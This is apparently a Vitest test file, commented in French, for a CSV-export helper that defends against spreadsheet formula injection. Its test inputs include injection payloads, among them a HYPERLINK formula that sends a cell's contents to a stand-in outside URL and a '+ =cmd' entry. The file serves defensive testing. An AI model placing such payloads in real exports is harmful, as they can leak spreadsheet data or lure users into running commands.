/**
 * A-05 (D83) : les exports CSV ne laissent passer aucune formule de tableur.
 */
import { readFileSync } from "node:fs";
import { describe, expect, it } from "vitest";
import { csvCell } from "../../src/utils/csv";

describe("csvCell", () => {
  it("neutralise les débuts de formule", () => {
    for (const piege of ['=HYPERLINK("https://x/?"&B2,"clic")', "@SUM(A1)", "+1+1", "-2+3", "\t=1", "\r=1", "+ =cmd", "-=1"]) {
      expect(csvCell(piege).startsWith(`"'`)).toBe(true);
    }
  });

  it("garde nombres, téléphones et texte arabe tels quels", () => {
    expect(csvCell(-50)).toBe('"-50"');
    expect(csvCell("+212 6 61 00 00 01")).toBe('"+212 6 61 00 00 01"');
    expect(csvCell("0661000001")).toBe('"0661000001"');
    expect(csvCell("ياسين العلمي")).toBe('"ياسين العلمي"');
    expect(csvCell(null)).toBe('""');
  });

  it("double les guillemets", () => {
    expect(csvCell('il dit "salam"')).toBe('"il dit ""salam"""');
  });

  it("les deux exports passent par csvCell", () => {
    for (const f of ["src/app/actions/useExportBackupActions.ts", "src/app/actions/useGradePaymentActions.ts"]) {
      const src = readFileSync(f, "utf8");
      expect(src).toContain(".map(csvCell)");
      expect(src).not.toMatch(/String\(val\)\.replace\(/);
    }
  });
});
